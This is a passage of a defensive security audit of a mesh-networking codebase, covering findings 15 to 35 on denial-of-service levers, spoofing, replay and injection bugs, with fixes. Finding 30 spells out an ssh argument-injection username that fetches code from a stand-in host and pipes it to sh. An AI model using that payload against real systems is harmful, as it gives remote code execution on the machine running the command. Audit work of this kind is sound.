> **Status — fixed.** The dial-back moved to `_reach_probe_answer`, run via
> `_spawn_bounded`. It still dials only `peer.transport.remote_ip()`, which is
> what stops it becoming a dial amplifier.

**Where** — `src/node.py`, `MeshNode._handle_reach_probe` → `_dial_back`.

**Reach** — `_handle_packet` → `_DIRECT_TYPES` → `_handle_reach_probe`
(authenticated immediate peer).

**What happens** — `ok = await self._dial_back(scheme, observed, port)` is
awaited inline. `_dial_back` is two bounded waits of `_REACH_DIAL_TIMEOUT`
(3 s each: connect, then receive) — up to 6 s per probe, in the ingress peer's
receive loop. `_reach_probe_allowed` permits 5 per 10 s window per peer, so the
link can be held busy for ~30 s out of every 10 s window: it never catches up.

**Impact** — that peer's link processes nothing else: its keepalive PINGs are
not answered, its RTT bookkeeping breaks, and any routed packet arriving on it
waits. It is the failure gotcha §10 documents, on a different handler. The
global `_REACH_DIALS_MAX = 8` bounds concurrency across peers but not the
inline wait.

**Fixing it without breaking something** — hand the dial-back to
`_spawn_bounded` (or `_track_route_task`) and send the `REACH_PROBE_ACK` from
that task. The security property to preserve is the one the comment states and
it is a good one: dial **only** `peer.transport.remote_ip()`, never an address
the peer supplied — that is what stops the probe becoming a dial amplifier
aimed at a victim.

---

## 15 — medium — Rate-limit tables are keyed by `id(peer)`

**Where** — `src/node.py`: `_seek_allowed`, `_carry_allowed`, `_query_allowed`,
`_dir_allowed`, `_reach_probe_allowed`, and `_gossip_allowed` (shared by the
catalog, release, release-serve and pseudo planes).

**What happens** — every one of these uses `key = id(peer)`. `id()` is the
object's address, which CPython reuses as soon as the object is collected. The
tables are pruned by *window expiry*, not by peer lifetime, so an entry outlives
the peer it described; a newly allocated `_Peer` landing on a freed address
inherits its counter.

**Impact** — two directions, both wrong:

- an honest peer can be born already throttled (or already cut off, for the
  window's remainder) because it inherited a hostile peer's count;
- an adversary can shed an exhausted budget by reconnecting — a fresh `_Peer`
  usually gets a fresh key, which makes every one of these limits a
  per-connection limit rather than a per-peer one, and connections are cheap
  (see **4**).

**Fixing it without breaking something** — key on the authenticated identity
where there is one (`peer.authenticated_id.raw`) and on the remote address for
the pre-auth planes, and clear the entry in `_reap_peer` / `_drop_failed_peer`.
Keep the tables bounded and pruned — that part is right, and `_gossip_allowed`
is correctly written as *one* implementation ("a second one would be a second
place to get a bound wrong"); fix it there and the four gossip planes follow.

---

## 16 — medium — A failed forward tears the target peer down inside the ingress loop

> **Status — fixed.** `_drop_failed_peer` is synchronous: it removes the peer
> from `self._peers` and the route hints at once (so the next
> `_route_candidates` cannot pick it), and hands `stop()` to `_spawn_bounded`.

**Where** — `src/node.py`, `_send_to_candidates` → `_drop_failed_peer` →
`_Peer.stop()`.

**Reach** — `_Peer._loop` → `_handle_packet` → `_forward_packet` →
`_send_to_candidates`.

**What happens** — when a send to a candidate raises, `_drop_failed_peer` is
awaited, and it awaits `peer.stop()`, which is bounded by `_PEER_STOP_TIMEOUT =
2.0` and then awaits `transport.close()`. `_route_candidates` returns up to
`_ROUTE_SEND_FANOUT = 5` peers, so a single forwarded packet can spend up to
~10 s tearing links down — inside the *ingress* peer's receive loop, which is
the loop gotcha §10 exists to protect.

**Impact** — an adversary that can make sends fail (a peer whose transport is
half-dead, a UDP link whose send queue is full — `UDPTransport.send` raises
`ConnectionError("udp send queue full")` at `_MAX_SEND_QUEUE = 128`) freezes an
arbitrary ingress link by aiming packets at destinations whose candidates are
those peers.

**Fixing it without breaking something** — mark the peer dead and hand the
teardown to `_spawn_bounded`, then continue to the next candidate immediately.
The invariant to preserve is the one the comment states: every remaining
candidate must still be tried before the packet is dropped, and the peer must
be removed from `self._peers` synchronously so the next `_route_candidates`
does not pick it again.

---

## 17 — medium — Pre-auth `HANDSHAKE` may be retried without limit on one connection

> **Status — fixed.** `_split_handshake` separates slicing from verifying, so
> the SHA-256 identity test runs before any signature work; the chain is parsed
> only once the packet has earned it; and `_MAX_HANDSHAKE_ATTEMPTS` bounds the
> tries one link gets.

**Where** — `src/node.py`, `MeshNode._handle_handshake`; `_decode_handshake` →
`_decode_chain` → `Certificate.deserialize` → `Certificate._build` →
`_verify_dsa`.

**Reach** — `_handle_packet` → not in `_DIRECT_TYPES`, not in
`_ROUTABLE_TYPES`, so it falls straight through to the handler on an
*unauthenticated* link.

**What happens** — the only guards are `peer.authenticated_id is not None` and
`peer.pending_challenge is None`. A failed attempt clears neither, so the same
connection may send `HANDSHAKE` packets for ever, and each one costs:

- one `Certificate._build` per certificate in the chain — each is a fresh
  `oqs.Signature(...)` context plus a full ML-DSA-65 verification. A 60 000-byte
  payload holds ~8 real certificates;
- one more ML-DSA verification for the handshake signature itself;
- a `verify_chain` walk.

Worse, the work is done in the *most* expensive order: `_decode_handshake`
(which verifies the whole chain) runs **before** the cheap
`claimed_id != NodeID(packet.src_id)` test, which is two SHA-256s.

**Impact** — a pre-auth CPU sink, multiplied by the number of connections an
attacker can hold (see **4**): ~9 post-quantum verifications per packet with no
rate limit and no cost to the sender beyond bandwidth.

**Fixing it without breaking something** — reorder so that the SHA-256 identity
test happens first (this needs the chain parsed lazily — split
`_decode_chain` into "slice the blob" and "verify the certificates"), cap the
number of attempts per connection, and bound the chain count explicitly (see
**22**). The property to keep is that a *legitimate* joiner may need more than
one attempt in the invite flow (`_handle_invite` → `INVITE_ACK` →
`initiate_handshake`), so the cap must be small but not one.

---

## 18 — medium — `RELAY_CARRY` / `INVITE_SEEK` give an unauthenticated peer a mesh injector

**Where** — `src/node.py`, `_handle_relay_carry` → `_forward_seek`, and
`_handle_invite_seek` → `_forward_seek`.

**Reach** — the first two branches of `_handle_packet`, before every
authentication gate. Any socket that connects reaches them.

**What happens** — `_forward_seek` picks the XOR-nearest *authenticated* peer
and forwards the packet with a decremented TTL. The packet carries up to 60 000
bytes of attacker-chosen payload and starts at `_SEEK_TTL = 16`. So an
unauthenticated party hands one packet to the edge of the mesh and up to 16
authenticated links carry it.

`_handle_relay_carry` also lets an unauthenticated sender feed arbitrary inner
packets into somebody else's relayed-invite session: when `dst_id` is us, it
looks up `self._relay_peers[packet.src_id]` — and `packet.src_id` is not
authenticated at this point — then `vp.transport.feed(inner)` with no bound on
`RelayedTransport._queue`.

**Impact** — a ~16× traffic amplifier into the authenticated mesh, available
without joining it (rate-limited to 256 carries / 20 seeks per 10 s *per link*,
and links are cheap — see **4**); plus disruption of an in-flight relayed
invitation by anyone who learns the seeker's node id.

**Fixing it without breaking something** — the pre-auth plane has to exist (a
joiner has no link yet, by definition), so the shape stays; what needs
tightening is the budget. Lower the effective TTL for a *pre-auth* forward, tie
the rate limit to something the attacker cannot cycle (see **15**), and give
`RelayedTransport._queue` a `maxsize`. Do **not** remove the `_rdv_lookup`
reverse-path branch in `_handle_relay_carry` — it is what lets the inviter's
answer get home.

---

## 19 — medium — One peer's word sets `_inbound_schemes`

> **Status — fixed.** `_note_reach_probe` records `(peer, scheme)` with a TTL
> and `_handle_reach_probe_ack` requires a match, consumes it, and ignores
> anything else.

**Where** — `src/node.py`, `MeshNode._handle_reach_probe_ack`.

**What happens** — the AutoNAT reply is taken at face value:

```python
if ok and scheme and self._transport_manager.is_supported(scheme):
    self._inbound_schemes.add(scheme)
```

There is no correlation with a probe we actually sent (no nonce, no pending
table), so any authenticated peer can assert reachability on any supported
scheme at any time.

**Impact** — `_inbound_schemes` feeds `reachability()`, `relay_capable()` and
what we advertise. A single hostile peer can make a node behind NAT advertise
itself as a reachable relay; every other node then routes through an address
that does not answer, and `_select_relays` offers it in relay-invite blocks.
It is a routing black hole planted by one link.

Contrast with the passive signal in `_handle_handshake`
(`if not peer.is_client_side: self._inbound_schemes.add(scheme)`) — that one is
*proof*: an inbound connection authenticated. The active one is a claim.

**Fixing it without breaking something** — correlate the ACK with an
outstanding probe (record scheme + a nonce in `probe_reachability`, require the
ACK to carry it back and to come from the peer that was asked), and treat one
peer's confirmation as weaker than an inbound authentication — e.g. require two
distinct peers, or re-confirm periodically and drop the flag when confirmation
stops. Keep the "PONG is unconditional" behaviour (gotcha §6) untouched; this
is a different plane.

---

## 20 — medium — `_handle_store` has no rate limit, and 128 MiB of LRU is an eviction lever

> **Status — fixed.** `_store_allowed` (`_STORE_RATE_MAX` per window per
> link). The content-addressing check is untouched.

**Where** — `src/node.py`, `MeshNode._handle_store`; `src/dht.py`,
`ContentStore` (`_MAX_ENTRIES = 8192`, `_MAX_BYTES = 128 MiB`).

**What happens** — `_handle_store` does no rate limiting at all (the sibling
`_handle_find_value` calls `_query_allowed`; `STORE` does not) and no
per-origin accounting. Content addressing stops a peer *choosing* a key, which
closes the poisoning vector — but it does not stop them filling the store:
random bytes hash to random keys, and every one is accepted.

Eviction is a single global LRU. The store is where app-package chunks and
release content live (`dht_put_many`, `fetch_app`), so evicting it is evicting
the distribution layer.

**Impact** — an authenticated peer can (a) park 128 MiB of RAM per node — a lot
for the constrained media this project targets — and (b) evict every legitimate
value on demand, breaking app installs and release fetches network-wide, with
no signature and no cost beyond bandwidth.

**Fixing it without breaking something** — put `STORE` behind `_query_allowed`
(or its own valve), and add a per-peer byte share so one link cannot own the
whole store. Keep the content-addressing check exactly where it is
(`ContentStore.put` rejecting `content_key(value) != key`) — that is the
anti-poisoning invariant and it is correct. Consider making `_MAX_BYTES`
configurable and defaulting it far lower; 128 MiB is not a bound a node on a
LoRa link can honour.

---

## 21 — medium — `RELEASE_DATA` slices are accepted from anyone

> **Status — fixed.** `_pending_slices` is keyed on the source as well, and a
> slice from anyone else is charged as abuse.

**Where** — `src/node.py`, `MeshNode._handle_release_data` / `_pull_slice`.

**What happens** — `_pending_slices` is keyed by `(release_id_hex, offset)`
only. `_handle_release_data` resolves the future with whatever payload arrived,
without checking that the sender is the node the slice was requested from. Any
authenticated peer that can guess or observe an in-flight download (the
`release_id` is public gossip; offsets are `0, 48 KiB, 96 KiB…`) can race the
real answer.

**Impact** — the final SHA-256 check in `ReleaseStore.put` catches the
corruption, so this is not a code-execution path — but it is a reliable
*update-denial*: every download of a given release can be made to fail, for
ever, at the cost of one packet per slice. Updates are a security mechanism, so
denying them indefinitely is a security outcome.

**Fixing it without breaking something** — include the expected source in the
pending key and drop a slice from anyone else, and count a mismatched slice as
abuse (`_charge_abuse`). Keep the multi-source fallback in
`_release_sources_for` — the swarm behaviour is the point — and keep the hash
check where it is: it is the only thing that decides the bytes are good.

---

## 22 — low — `_decode_chain` does not bound the certificate count

> **Status — fixed.** `count > _ENTRY_CHAIN_MAX` is refused before the loop.

**Where** — `src/node.py`, `_decode_chain` (`count = data[0]`, up to 255).

**What happens** — every other decoder in the file states its ceiling
(`_ENTRY_POOL_MAX`, `_ENTRY_CHAIN_MAX`, `_ENTRY_COUNT_MAX`, `_MAX_ADDRESSES`).
This one does not: the only limit is the 60 000-byte payload, which happens to
allow ~8 real ML-DSA certificates. That is a bound by accident, not by design —
it moves the day a smaller signature scheme is added, and it is the shared
decoder for `HANDSHAKE`, `HANDSHAKE_ACK`, `E2E_HANDSHAKE` and `_ACK`.

**Fixing it** — reject `count > _ENTRY_CHAIN_MAX` up front, before the loop.
`verify_chain` should refuse an over-long chain too, so the bound is stated on
both sides.

---

## 23 — low — `RoutingTable._bucket_index(own_id)` indexes bucket `-1`

**Where** — `src/routing.py`, `RoutingTable._bucket_index`
(`return self._own_id.distance(node_id).bit_length() - 1`).

**What happens** — for our own id the distance is 0, `bit_length()` is 0, and
the index is `-1`, which Python resolves to the *last* bucket. `add()` guards
against this by returning early, but `get`, `remove` and `contains` do not — so
`contains(self._id)` silently interrogates bucket 159. It happens to be
harmless today only because `add` refuses to store our own id.

**Fixing it** — guard the index (return early for our own id, or clamp), so the
next caller who reaches `get`/`remove` with an arbitrary id is not relying on
an accident. Note that `_handle_found_node` deliberately reasons about
`contains(self._id)` being false for ever (gotcha §12) — keep that behaviour,
just make it explicit rather than an artefact of a negative index.

---

## 24 — low — `SpoolServer` has no peer cap and an unbounded `_seen` set

> **Status — fixed.** `_MAX_SESSIONS` live links, `_MAX_SEEN` remembered
> names, and `_SESSION_RE` so only a name `connect` would write is a session.

**Where** — `src/spool_transport.py`, `SpoolServer._accept_loop`.

**What happens** — every `sess-*` directory found in the link directory becomes
a transport and a peer, with no ceiling; `self._seen` grows one entry per
session name for the life of the process. The medium is explicitly an untrusted
one (a removable device, a shared directory), so whoever can write there
controls both.

**Fixing it** — cap concurrent spool transports (the way `UDPServer` caps at
`_MAX_PEERS_UDP`), bound `_seen`, and ignore names that are not the exact
`sess-` + 16 hex characters the client writes.

---

## 25 — low — `_note_release_source` bounds the outer table with the inner constant

**Where** — `src/node.py`, `MeshNode._note_release_source`.

```python
del sources[:-_RELEASE_SOURCES_MAX]                     # per release: 8 nodes
while len(self._release_sources) > _RELEASE_SOURCES_MAX: # releases tracked: also 8
    self._release_sources.popitem(last=False)
```

`_RELEASE_SOURCES_MAX` is documented as "nodes remembered as holding a given
release" and is used for both axes. The outer table therefore remembers sources
for only 8 releases — which is a bound, so nothing overflows, but it is not the
bound anyone reading the constant would expect. This is the "name the thing,
then count the thing" rule in `CLAUDE.md`: one constant, two meanings.

**Fixing it** — a second, named constant for the number of releases tracked.

---

## 26 — low — `PseudoBook.offer` drains a bucket with an unbounded `while`

**Where** — `src/pseudo_dir.py`, `PseudoBook.offer`.

```python
while len(bucket) > self._max_per_key:
    self.forget(bucket[0])
```

`forget` shrinks `bucket` only if `self._by_node[bucket[0]]["key"]` is the same
key this bucket is filed under — `_unindex` removes from
`self._by_key[entry["key"]]`, not from `bucket`. The invariant holds today
because `offer` always `_unindex`es before re-indexing, so the loop terminates.
It is a loop whose termination depends on an invariant maintained three methods
away, on the path that absorbs claims from strangers.

**Fixing it** — make the drain structural (pop from the bucket, then forget), so
progress does not depend on a remote invariant. The `return node_id in
self._by_node` at the end is subtle and correct — a claim evicted on the way in
must not report "our view changed", or gossip never terminates under memory
pressure — keep it.

---

## 27 — critical — A chat file transfer can buffer gigabytes per peer

> **Status — fixed.** `_MAX_CHUNKS` is derived from `FILE_CHUNK_SIZE` rather
> than from 1024; an offer whose chunk count contradicts its size is refused;
> `_Transfer.accept` bounds each chunk and the running total against the
> declared size; and `_MAX_TRANSFERS_PER_PEER` stops one sender owning every
> slot.

**Where** — `src/apps/chat.py`, `_on_offer` / `_on_chunk` / `_Transfer`.

**Reach** — mesh `DATA` → `_handle_data` → `_data_queue` → `DataConnector._pump`
→ the chat section → `ChatApp._dispatch` → `_on_offer` / `_on_chunk`. Any node
that can open an E2E session with this one and speak the chat app section.

**What happens** — the offer declares `size` and `total` (chunk count):

```python
if size > _MAX_FILE or total > _MAX_CHUNKS:      # 256 MiB, 262 144
    return
```

and then each chunk is stored with **no accounting at all**:

```python
data = body[_CHUNK.size:]
t = self._transfers.get((src.raw, tid))
if t is None or index >= t.total or index in t.chunks:
    return
t.chunks[index] = data
```

Nothing checks the chunk's length, nothing sums what has been buffered, and
nothing ties `total` to `size`. The declared `size` and the SHA-256 are only
consulted in `complete()`/`assemble()` — *after* every chunk is in memory.

Two numbers make this large. `_MAX_CHUNKS = _MAX_FILE // 1024 = 262 144` is
derived as though a chunk were 1 KiB, while the sender actually uses
`FILE_CHUNK_SIZE = 48 000` — a 48× mismatch. And a chunk's payload is bounded
only by the mesh packet (~60 000 bytes). So one offer of a *one-byte* file
declaring `total = 262 144` lets the sender push
`262 144 × ~60 000 ≈ 15.7 GB` into `t.chunks` before anything is verified.
`_MAX_TRANSFERS = 64` concurrent transfers multiply that.

**Impact** — the cheapest and largest memory-exhaustion path in the tree: a
peer with a chat session kills the node (and, on a shared host, the machine)
with a few hundred megabytes of traffic. `CLAUDE.md` §2: "Bounds everywhere.
Every queue, cache, buffer and counter has a hard limit."

**Fixing it without breaking something** — three bounds, all cheap:

- reject a chunk whose length exceeds `FILE_CHUNK_SIZE`;
- keep a running byte total on `_Transfer` and drop the transfer the moment it
  exceeds the declared `size`;
- in `_on_offer`, require `total == ceil(size / FILE_CHUNK_SIZE)` (and fix
  `_MAX_CHUNKS` to be derived from `FILE_CHUNK_SIZE`, not from 1024).

Keep the final `size` + SHA-256 check exactly where it is — it is what makes a
completed transfer trustworthy. Also consider keying `_MAX_TRANSFERS` per
source: `(src.raw, tid)` with an attacker-chosen `tid` lets one peer occupy all
64 slots and deny transfers from everyone else.

---

## 28 — high — Raw UDP punch probes buy an ML-DSA verify *and* a signature, unmetered

> **Status — fixed.** `_punch_datagram_allowed` meters per source address
> *before* any crypto, and `_punch_signed_blob` binds a probe to its recipient
> and to a minute, so a captured one is no longer a token good anywhere for
> ever.

**Where** — `src/node.py`, `handle_udp_datagram` →
`_handle_punch_probe_datagram` / `_handle_punch_ack_datagram`.

**Reach** — `UDPServer._dispatch_datagram` sees the `NPPB`/`NPAK` magic and
hands the datagram to `on_raw_datagram`. No connection, no session, no
handshake — a single spoofable UDP datagram.

**What happens** — the handler looks the claimed `node_id` up in the routing
table (public information, gossiped through `FOUND_NODE` and `PING`) and, if it
has a key, runs a full ML-DSA-65 verification on attacker-supplied bytes:

```python
if not self._identity.verify(
        _PUNCH_PROBE_MAGIC + node_id_raw + nonce, signature, entry.dsa_pub):
    return
```

`_PUNCH_SIG_MAX` bounds the signature at 5 000 bytes; nothing bounds the
*rate*. Every other expensive plane in this file has a valve
(`_query_allowed`, `_gossip_allowed`, `_seek_allowed`, `_dir_allowed`); this
one has none, and it is the only one reachable with no link at all.

On a probe that *does* verify, the node then **signs** an ACK
(`self._identity.sign(...)`) and sends it to the datagram's source address.
Signing is more expensive than verifying.

Worse, the signed blob is `MAGIC ‖ node_id ‖ nonce` — it names neither the
recipient nor a time. A probe captured once is replayable for ever, against any
node, so an attacker who has seen one legitimate probe can make an unlimited
number of nodes each perform one ML-DSA signature and emit a ~3.4 kB ACK to a
source address of the attacker's choosing.

**Impact** — an unauthenticated CPU sink (one verify per datagram) plus a
reflector (one signature and one ~3.4 kB datagram per replayed probe, aimed
anywhere). It needs no membership, no invite and no key material.

**Fixing it without breaking something** — rate-limit raw punch datagrams per
source address *before* the verification, and bind the probe signature to the
recipient and to a time window (add `dst_id` and a timestamp to the signed
blob, and refuse a stale one). Keep the "look the key up in the routing table
first" ordering — a probe naming an unknown id is already dropped for free, and
that is the cheapest gate there is. Note that `Docs/Architecture/gotchas.md`
warns against deleting `_punch_pending` too eagerly; a rate limit must not
touch that state.

---

## 29 — high — Any datagram with the STUN magic cookie rewrites our public address

**Where** — `src/node.py`, `_handle_stun_keepalive_response`, and
`_send_nat_keepalive` which never records the transaction id it sent.

**Reach** — `UDPServer._dispatch_datagram` routes anything whose bytes 4..8 are
the STUN magic cookie to `handle_udp_datagram` → this handler. Any host that
can send a UDP packet to the node's listener port.

**What happens** — `stun._parse_binding_response(data, txn_id)` *does* verify
that the response echoes the transaction id we sent. The call site defeats it:

```python
result = _parse_binding_response(data, data[8:20])
```

The "expected" id is taken from the datagram being checked, so the comparison is
a tautology. The comment even says why — "use it directly so the
XOR-MAPPED-ADDRESS de-XORs correctly without our tracking it" — but not
tracking it is exactly what removes the check. `_send_nat_keepalive` builds a
request with `os.urandom(12)` inside `_build_binding_request()` and throws the
id away.

The result is written straight into node state:

```python
self._observed_udp_addr = (ip, port)
... self._extra_addrs.append(ip)
```

**Impact** — an off-path attacker sets the node's believed public address. That
address is then advertised to the whole mesh (`advertised_uris` →
`_announce_addresses`, `FOUND_NODE` entries), fed into hole punching, and shown
in the console. Consequences: peers waste dials on an address that does not
answer, the node can be made to look reachable when it is not, and
`_extra_addrs` (capped at `_MAX_EXTRA_ADDRS = 8`, and never pruned of bad
entries except on a `public_ip` change) fills with attacker-chosen values,
crowding out the real one.

Compare `stun.query_stun_server`, which is correct: it opens a *connected*
datagram endpoint and passes the transaction id it actually generated.

**Fixing it without breaking something** — keep the transaction id from
`_send_nat_keepalive` in a small bounded set with a short TTL and pass the
*expected* id to `_parse_binding_response`; drop responses that do not match, and
drop responses whose source is not the STUN server we asked. The reason the
listener socket is used rather than a fresh one is sound and must stay: only
that socket's NAT mapping is the one peers reach.

While in there: `_send_nat_keepalive` calls `await loop.getaddrinfo(...)`. That
is the exact trap `Docs/Architecture/gotchas.md` §2 documents — asyncio joins
its default executor at shutdown, so a DNS lookup that hangs on a restricted
network wedges interpreter exit. `ip_utils.bounded_getaddrinfo` exists for this
and is used by `stun.py` and `fleet_ssh.py`; this is the one call site that
does not use it.

---

## 30 — high — Argument injection into `ssh` from a fleet provisioning request

> **Status — fixed.** `_ACCOUNT_RE` holds a username (and `sudo_user`) to a
> real account name, `_usable_key_path` refuses a `-i` value that would lead an
> argv element, and the destination is passed as `-l user host` rather than
> glued.

**Where** — `src/apps/fleet_ssh.py`, `run()`
(`argv += [f"{creds.username}@{host}", "--"] + list(command)`) and
`_base_options` (`options += ["-i", key_path, ...]`);
`src/apps/fleet_ssh.py`, `SshCredentials.__init__`;
`src/apps/fleet.py`, `_run_provision`.

**Reach** — mesh `DATA` → chat/fleet section → `FleetApp._dispatch` →
`_open_signed` (signature + capability verified) → `_on_provision_request` →
`_run_provision` → `SshCredentials(str(document.get("username", "")), …,
key_path=document.get("key_path"), …)` → `fleet_ssh.run(...)`.

**What happens** — `SshCredentials` validates the username as "non-empty, at
most 64 characters, no whitespace". It does **not** refuse a leading `-`. The
username is then pasted into an argv element:

```python
argv += [f"{creds.username}@{host}", "--"] + list(command)
```

OpenSSH parses a leading `-` as an option, and `-o` accepts its argument
attached. A username such as
`-oProxyCommand=curl${IFS}http://x/y|sh#` is 38 characters, contains no
whitespace, and turns the destination token into an option that makes OpenSSH
run that string through `/bin/sh`. `${IFS}` supplies the spaces the validator
forbids; the trailing `#` comments out the `@host` suffix.

`key_path` has the same shape: it is taken verbatim from the request
(`str(key_path)[:512]` on the sender's side, no validation on the receiver's)
and lands as `["-i", key_path]` — and, being a separate argv element, a value
starting with `-` is parsed as an option in its own right.

**Impact** — a node holding only the `provision` capability gains arbitrary
command execution as the account running NMesh on the provisioning node.
`provision` is a *scoped* grant — "install NMesh on machines you can reach,
from the tree I already have" — and `build_payload(self._repo_root)` makes sure
the pushed code is the local tree, not something the requester supplied. This
turns that scoped grant into full code execution, which is precisely the
escalation `Docs/Apps/fleet` says the capability ledger prevents
("Authentication is not authorisation").

**Fixing it without breaking something** — reject a username (and a
`sudo_user`) that does not match a conservative account pattern
(`^[A-Za-z_][A-Za-z0-9_.-]{0,31}$`), and pass the destination as
`["-l", username, host]` rather than gluing it, so a stray `-` can never lead
an argv element. Constrain `key_path` to a path the operator configured
(`local_keys()` already enumerates the acceptable ones) rather than accepting
an arbitrary string, and refuse anything starting with `-`.

Do not "fix" this by shell-quoting: nothing here goes through a shell, and the
defect is argv parsing, not quoting. The `MaterialisedKey` / pty machinery that
keeps the password out of `argv` is correct and must be preserved.

---

## 31 — medium — Scan results choose where the operator's SSH password goes

> **Status — fixed.** `_is_literal_address` gates `ip` both where a scan
> reply arrives (`_clean_scan_hosts`) and where a target is used
> (`_clean_targets`), so the console never offers a row naming somewhere else.

**Where** — `src/apps/fleet.py`, `_clean_targets`; the scan reply path
`_on_scan_report` → `ScanReceived`; `provision_local` / `request_provision`.

**What happens** — `_clean_targets` accepts `ip` as *any* string of 1..64
characters. It is never checked to be a literal IP address, and the label shown
in the interface is `str(entry.get("label") or ip)[:128]` — also attacker-chosen.
That string becomes the SSH destination (`f"{username}@{host}"`) and the
`ssh-keyscan` target.

The values arrive from a **managed node's LAN scan**: the operator asks a node
to scan, picks hosts from the answer, and deploys. A hostile or compromised
managed node can therefore return a host whose label reads `192.168.1.42` and
whose `ip` is `collector.attacker.example`.

**Impact** — the operator's SSH username and password (and, in the
`provision_local` path, from their own machine) are offered to a host the
attacker chose. OpenSSH will send the password to whatever server answers, so
this is straightforward credential theft — and `StrictHostKeyChecking` is
`accept-new` when no key was pinned, so the first connection succeeds silently.

**Fixing it without breaking something** — validate `ip` as a literal address
(`socket.inet_pton` for v4/v6) at the point it is accepted from the network, and
show the address in the interface next to the label rather than letting the
label stand in for it — the same rule the console applies to pseudos ("a name
never travels bare; the id always travels with it"). Keep the `known_hosts`
pinning path: it is the thing that makes a confirmed host safe.

---

## 32 — medium — The invitation lockout is per connection, not per node

**Where** — `src/invite.py` (`record_failure`, `is_locked_out`);
`src/node.py`, `_handle_invite` (`peer._invite_failures`).

**What happens** — `Docs/Architecture/security.md` states:
"Anti-bruteforce: `_MAX_FAILURES = 3` → a `_LOCKOUT_TTL = 60 s` lockout." The
`InviteManager` implements exactly that — and **nothing ever calls
`record_failure()`** (`grep -rn record_failure src/` finds only its definition
and `verify_response`'s use of `is_locked_out`, which is therefore always
False). The real gate is per `_Peer`:

```python
if peer._invite_failures >= 3 and time.monotonic() - peer._invite_lockout_ts < 60:
    return
```

A `_Peer` is one link. Dropping the connection and reconnecting yields three
fresh attempts, at no cost — and `_on_new_transport` accepts up to 128
concurrent links.

**Impact** — the node-wide lockout described in the documentation does not
exist. The practical risk is low (a code is 10 characters from a 62-character
alphabet, and a seeded code is 64 bits), so this is a defence-in-depth gap
rather than a break — but it is also documentation that lies, which
`CLAUDE.md` treats as a bug in its own right.

**Fixing it without breaking something** — call `self._invite.record_failure()`
alongside the per-peer counter in `_handle_invite`, so the manager's lockout
becomes real. Keep the per-peer counter too: it is what lets one abusive link be
cut without locking out an honest joiner. Then update
`Docs/Architecture/security.md` in the same commit, or fix the sentence to
describe the per-link behaviour if the per-node one is deliberately not wanted.

**Related, same file** — `_recognize_seek` iterates `self._invite._codes` and
matches on the hash **without checking the TTL**, so an expired code still
returns "recognised" and still starts a relayed invite (`_start_relay_invite`
allocates a virtual peer against `_MAX_RELAY_PEERS` and `_MAX_PEERS`). The code
cannot actually be redeemed — `verify_response` does expire it — so this is
wasted state, not an authentication hole. `_codes` is also only ever pruned
inside `verify_response`, so expired entries accumulate for the life of the
process.

---

## 33 — medium — `verify_assertion` burns the anti-replay nonce before checking the signature

> **Status — fixed.** `nonces.claim` moved below the signature check; a
> forged assertion now consumes no cache slot.

**Where** — `src/app_auth.py`, `verify_assertion`.

**What happens** — the function's own comment states the intent:

```python
# Burn the nonce only once everything cheap has passed, so a flood of
# rubbish cannot evict live entries from a bounded cache.
if nonces is not None and not nonces.claim(parsed.nonce, parsed.expires_at, now=stamp):
    return None
try:
    if not verifier(parsed.signed_body(), parsed.signature, parsed.subject_pub):
        return None
```

The signature check comes *after* the claim. Everything before the claim is
structural: app id, audience, purpose, ctx, freshness — all values an attacker
simply copies from a legitimate assertion or picks correctly. So an attacker can
mint assertions with a valid-looking header, a random nonce and a **garbage
signature**, and each one consumes a slot in the bounded `NonceCache`
(`MAX_NONCES = 8192`, oldest evicted first) at zero cryptographic cost.

**Impact** — the replay window reopens on demand: 8 192 junk frames evict every
genuinely burnt nonce, after which a captured assertion can be replayed inside
its TTL. On the fleet path that is a replayed *signed command*.

**Fixing it without breaking something** — move the `nonces.claim` call below
the signature verification. The stated ordering principle ("cheapest and most
discriminating first, signature last") stays intact; the nonce burn is not a
check, it is a mutation, and mutations belong after the last gate. The
`NonceCache` shape (bounded, expiry-driven, degrading into a shorter window) is
right and needs no change.

---

## 34 — medium — The console reads an unauthenticated body of up to 64 MiB

> **Status — fixed.** `do_POST` checks the session before reading anything
> larger than `_MAX_BODY`, and `/api/login` — the one route that cannot be
> authorised first — is held to `_MAX_BODY`. The login throttle now decides and
> counts under one lock, with `_LOGIN_MAX_INFLIGHT` bounding concurrent scrypt
> work. The TLS-key `chmod` half is in the console pass.

**Where** — `src/webconsole.py`, `Handler.do_POST`.

**What happens** — the body is read *before* the session check:

```python
if path in ("/api/chat/file", "/api/chat/profile"):
    cap = _MAX_CHAT_UPLOAD          # 64 MiB
...
body = self._read_body(cap)
...
if path == "/api/login" and remote is None: ...
# everything below requires auth
if not self._authed():
    self._json(401, {"error": "unauthorized"})
```

`_read_body` does `self.rfile.read(length)` — the whole body into memory. The
server is a `ThreadingHTTPServer` with no cap on concurrent connections, so N
unauthenticated `POST /api/chat/file` requests hold N × 64 MiB.

**Impact** — memory exhaustion of the management plane by anyone who can reach
the port. The console binds to loopback by default, which limits it to local
users and to whatever the operator exposed deliberately; `CLAUDE.md` says the
local machine is in the threat model too.

**Fixing it without breaking something** — check `_authed()` before reading a
body larger than `_MAX_BODY`, and answer 401 without draining (the handler
already sets `close_connection = True` on an oversize body, which is the right
move). `/api/login` must keep reading its (small) body pre-auth. A cap on
concurrent handler threads is worth adding at the same time.

**Related, same file** — the login throttle is not thread-safe.
`console._fail_count += 1` and `console._lockout_until` are plain attributes
mutated from `ThreadingHTTPServer` worker threads with no lock, while
`_tokens` correctly uses `_tokens_lock`. Concurrent login attempts all pass
`_locked_out()` before any of them records a failure, and the `+=` loses
increments, so the "5 failures then 60 s" bound is really "as many parallel
attempts as the attacker opens, then 60 s". Each of those attempts costs one
`scrypt(n=16384, r=8)` — 16 MiB and a measurable slice of CPU — so it is a CPU
and memory lever as much as a throttle bypass. Guard both fields with a lock
(and take the decision and the record under the same lock).

**Related, same file** — `_build_ssl_context` writes the console's TLS private
key with `open(key_path, "wb")` and then `os.chmod(..., 0o600)`. That is the
window `CLAUDE.md` explicitly rejects for the identity file ("created 0600 at
open time — not a `chmod` afterwards"). Use `os.open(..., O_CREAT|O_WRONLY, 0o600)`
as `console_auth.write` and `crypto.save` already do. The same pattern appears
in `DataConnector.start`, which binds a Unix socket and then chmods it to 0600.

---

## 35 — medium — HTML injection into the node view from a remote console

> **Status — fixed.** `esc()` on the value in `nodeview.glanceHTML` and in
> `fleet.statusHTML` — both render documents that crossed the mesh.

**Where** — `src/webassets/nodeview.py`, `glanceHTML`.

```js
const cell = (label, value, extra) =>
  '<div class="stat sm"><span class="v">' + value + '</span>...';
...
